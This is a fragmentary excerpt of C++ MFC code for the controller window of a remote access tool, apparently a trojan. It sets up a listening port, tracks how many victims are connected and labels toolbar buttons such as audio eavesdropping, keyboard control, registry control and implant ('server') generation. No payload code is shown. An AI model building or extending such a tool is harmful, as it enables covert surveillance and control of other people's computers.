...
void CCcRemoteDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	...
	if (m_iocpServer->Initialize(NotifyProc, NULL, nMaxConnections, nPort))
	{
		...
		str.Format("監聽端口: %d成功", nPort);
		ShowMessage(true, str);
	}
	else
	{
		str.Format("監聽端口: %d失敗", nPort);
		ShowMessage(true, str);
	}
...
void CCcRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)
{
	...
	if (strMsg.Find("上線") > 0)         // 处理上线还是下线消息
	{
		m_OnlineCount++;
	}
	else if (strMsg.Find("下線") > 0)
	{
		m_OnlineCount--;
	}
	else if (strMsg.Find("斷開") > 0)
	{
		m_OnlineCount--;
	}
	m_OnlineCount = (m_OnlineCount <= 0 ? 0 : m_OnlineCount);			// 防止iCount 有-1的情况
	strStatusMsg.Format("以連結: %d", m_OnlineCount);
...
void CCcRemoteDlg::InitToolBar()
{
	...
	m_ToolBar.SetButtonText(0, "終端控制");
	m_ToolBar.SetButtonText(1, "進程控制");
	m_ToolBar.SetButtonText(2, "窗口控制");
	m_ToolBar.SetButtonText(3, "桌面控制");
	m_ToolBar.SetButtonText(4, "文件下載");
	m_ToolBar.SetButtonText(5, "語音監聽");
	m_ToolBar.SetButtonText(6, "鍵盤控制");
	m_ToolBar.SetButtonText(7, "服务管理");
	m_ToolBar.SetButtonText(8, "註冊表控制");
	m_ToolBar.SetButtonText(10, "參數設置");
	m_ToolBar.SetButtonText(11, "服務端生成");
	m_ToolBar.SetButtonText(12, "幫助");
